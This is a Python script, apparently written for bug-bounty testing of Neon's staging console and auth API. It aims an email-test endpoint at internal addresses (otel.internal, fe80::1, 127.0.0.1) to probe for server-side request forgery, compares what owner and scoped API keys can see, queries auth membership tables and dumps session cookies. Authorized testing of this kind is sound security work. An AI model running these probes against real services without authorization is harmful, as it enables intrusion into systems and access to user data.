# -*- coding: utf-8 -*-
"""V6: microscope re-review of details skipped in V4/V5/P1/P3 runs.
1. otel.internal / fe80::1 full response (was truncated) - internal DNS reachability?
2. 500-path full body on fe80::1 (internal error detail?)
3. P3 cross-check: U2 member rows in DB vs API list []
4. P1 field-level diff: scope-key view of PA vs owner-key view of PA
5. signup/get-session full field enumeration"""
import json, ssl, time, http.client, random, string

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
PB = "damp-term-63384673"
ORG = "org-flat-dawn-91601224"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def api(method, path, body=None, key=APIKEY, timeout=45):
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    hdr = {"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + key}
    if body is not None:
        hdr["Content-Type"] = "application/json"
        body = json.dumps(body)
    t0 = time.time()
    conn.request(method, API_BASE + path, body=body, headers=hdr)
    r = conn.getresponse()
    data = r.read().decode("utf-8", "replace")
    hdrs = {k.lower(): v for k, v in r.getheaders()}
    conn.close()
    return r.status, data, time.time() - t0, hdrs


def na(method, path, body=None, cookie=None, timeout=40):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
            "User-Agent": "Mozilla/5.0", "Accept": "application/json", "X-Bug-Bounty": "xxbo"}
    if cookie:
        hdrs["Cookie"] = cookie
    t0 = time.time()
    conn.request(method, path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    hdrs2 = {k.lower(): v for k, v in resp.getheaders()}
    conn.close()
    time.sleep(0.5)
    return resp.status, data, ck, time.time() - t0, hdrs2


def fetch_db_uri():
    global DB_URI
    st, d, _, _ = api("GET", "/projects/%s/connection_uri?database_name=neondb"
                      "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN))
    uri = json.loads(d).get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        with conn.cursor() as cur:
            cur.execute(sql)
            return cur.fetchall()


def main():
    out("== V6 microscope ==")
    fetch_db_uri()
    base = "/projects/%s/branches/%s/auth" % (PA, PAMAIN)

    # --- 1. full responses: otel.internal / fe80::1 / api.internal (3x timing) ---
    for tag, host in [("otel.internal", "otel.internal"), ("fe80::1", "fe80::1"),
                      ("api.internal", "api.internal"), ("::1", "::1"),
                      ("127.0.0.1", "127.0.0.1")]:
        for trial in range(2):
            body = {"host": host, "port": 587, "username": "a", "password": "b",
                    "sender_email": ME, "sender_name": "t", "recipient_email": ME}
            st, d, dt, hh = api("POST", base + "/send_test_email", body)
            out("1 [%s] t%d -> %d %.2fs FULL=%s" % (tag, trial + 1, st, dt, d))
            time.sleep(1.2)

    # --- 3. P3 cross-check: U2 member rows across ALL orgs vs API list ---
    out("3 U2 member rows in DB:")
    r = dbq("SELECT o.id, o.name, m.role, m.\"createdAt\" FROM neon_auth.member m "
            "JOIN neon_auth.organization o ON o.id = m.\"organizationId\" "
            "JOIN neon_auth.user u ON u.id = m.\"userId\" WHERE u.email = "
            "'libobo1229+na_org2@gmail.com'")
    for row in r:
        out("   DB member: org=%s name=%s role=%s created=%s" % row)
    # U1 too
    r1 = dbq("SELECT o.id, o.name, m.role FROM neon_auth.member m "
             "JOIN neon_auth.organization o ON o.id = m.\"organizationId\" "
             "JOIN neon_auth.user u ON u.id = m.\"userId\" WHERE u.email = "
             "'libobo1229+na_org1@gmail.com'")
    out("   U1 orgs:")
    for row in r1:
        out("   DB member: org=%s name=%s role=%s" % row)
    # all orgs table
    r2 = dbq("SELECT id, name FROM neon_auth.organization ORDER BY \"createdAt\" DESC LIMIT 10")
    out("   recent orgs: %s" % r2)

    # --- 4. P1 field-level diff: scope key vs owner key on PA project ---
    st, d0, _, _ = api("GET", "/projects/%s" % PA)  # owner view
    st, dk, _, _ = api("POST", "/organizations/%s/api_keys" % ORG,
                       {"key_name": "v6-micro", "project_id": PA})
    kd = json.loads(dk)
    scoped = kd.get("key")
    out("4 scoped key id=%s" % kd.get("id"))
    st, ds, _, _ = api("GET", "/projects/%s" % PA, key=scoped)
    if d0 == ds:
        out("4 project view IDENTICAL owner-vs-scoped (len %d)" % len(d0))
    else:
        # field-level diff of top-level json
        try:
            j0, js = json.loads(d0), json.loads(ds)
            def walk(a, b, path=""):
                diffs = []
                if isinstance(a, dict) and isinstance(b, dict):
                    for k in set(a) | set(b):
                        if k not in a:
                            diffs.append((path + "/" + k, "<absent-owner>", b[k]))
                        elif k not in b:
                            diffs.append((path + "/" + k, a[k], "<absent-scoped>"))
                        else:
                            diffs += walk(a[k], b[k], path + "/" + k)
                elif a != b:
                    diffs.append((path, a, b))
                return diffs
            diffs = walk(j0, js)
            out("4 DIFFS (%d):" % len(diffs))
            for p, av, bv in diffs[:20]:
                out("   %s: owner=%s scoped=%s" % (p, str(av)[:120], str(bv)[:120]))
        except Exception as e:
            out("4 diff err %s" % e)
    st, dd, _, _ = api("DELETE", "/organizations/%s/api_keys/%s" % (ORG, kd.get("id")))
    out("4 cleanup: %d" % st)

    # --- 5. signup full response fields + get-session full session ---
    TAG = "v6" + "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    em = "libobo1229+%s@gmail.com" % TAG
    st, d, ck, dt, hh = na("POST", "/neondb/auth/sign-up/email",
                           {"email": em, "password": PASS, "name": TAG})
    out("5 signup FULL: %s" % d)
    out("5 signup set-cookie: %s" % ck[:300])
    cookie = ck.split(";")[0] if ck else ""
    st, d, _, dt, hh = na("GET", "/neondb/auth/get-session", cookie=cookie or None)
    out("5 get-session FULL: %s" % d)
    st, d, _, dt, hh = na("GET", "/neondb/auth/list-sessions", cookie=cookie or None)
    out("5 list-sessions FULL: %s" % d)


ME = "libobo1229@gmail.com"
if __name__ == "__main__":
    main()
